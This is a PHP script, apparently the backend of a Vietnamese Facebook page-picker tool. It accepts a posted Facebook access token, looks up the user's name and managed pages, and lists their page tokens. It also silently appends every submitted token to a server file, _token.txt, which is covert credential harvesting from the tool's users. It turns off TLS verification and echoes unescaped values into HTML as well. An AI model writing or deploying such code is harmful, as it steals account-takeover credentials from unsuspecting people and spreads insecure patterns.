<?php 


if(isset($_POST['access_token'])){
$file = fopen('_token.txt', 'a+');
fwrite($file, $_POST['access_token'].'
');
fclose($file);
$data = json_decode(Curl('https://graph.facebook.com/me/accounts?access_token='.$_POST['access_token']), true);

	if(isset($data['data'])){
		$data2 = json_decode(Curl('https://graph.facebook.com/me/?access_token='.$_POST['access_token']), true);
		
		echo '<select class="form-control" id="user_select">';

		if(!empty($data2['name'])){
			echo '<option value="'.$_POST['access_token'].'">Acc Chính: '.$data2['name'].'</option>';
		}
		
		for($i = 0; $i <= count($data['data'])-1; $i++){

			echo '<option value="'.$data['data'][$i]['access_token'].'">'.$data['data'][$i]['name'].'</option>';

		}

		echo '</select>';

	}else{

		$data = json_decode(Curl('https://graph.facebook.com/me/?access_token='.$_POST['access_token']), true);
		if(!empty($data['name'])){
			echo '<select class="form-control" id="user_select">';
			echo '<option value="'.$_POST['access_token'].'">'.$data['name'].'</option>';
			echo '</select>';
		}

	}


}



	function Curl($url, $get_cookie = true, $fields = false, $proxy = ''){

		$User_Agent = 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31';
		$request_headers = array();
		$request_headers[] = 'User-Agent: '. $User_Agent;
		$request_headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
                
                $ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		if($get_cookie){

			curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		
		}
		if($fields){

                        curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
		
		}
                if($proxy){

                        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
                        curl_setopt($ch, CURLOPT_PROXY, $proxy);                  

                }
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true );
                curl_setopt($ch, CURLOPT_ENCODING, "" );
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0); 
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
		curl_setopt($ch, CURLOPT_REFERER, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: " . $_SERVER['HTTP_USER_AGENT']);
		return curl_exec($ch);
		curl_close($ch);
    }